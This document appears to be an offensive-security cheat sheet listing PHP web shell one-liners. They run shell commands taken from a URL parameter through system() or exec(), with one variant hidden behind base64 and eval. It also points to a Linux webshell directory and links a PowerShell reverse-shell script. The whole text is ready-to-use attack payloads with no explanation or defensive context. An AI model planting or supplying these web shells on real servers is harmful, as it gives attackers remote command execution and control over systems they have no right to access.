## Collections 
```
/usr/share/webshells/
```

## PHP

### Simple 'cmd' exec
```
echo system($_GET['c']);
```

```
echo exec($_GET['c']);
```

#### Base64 encoded:
```
eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7'));
```

#### With if
```
if (isset($_GET["c"])) { echo system($_GET['c']); }
```

### External References
- Invoke-PowerShellTcpOneLine.ps1: [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
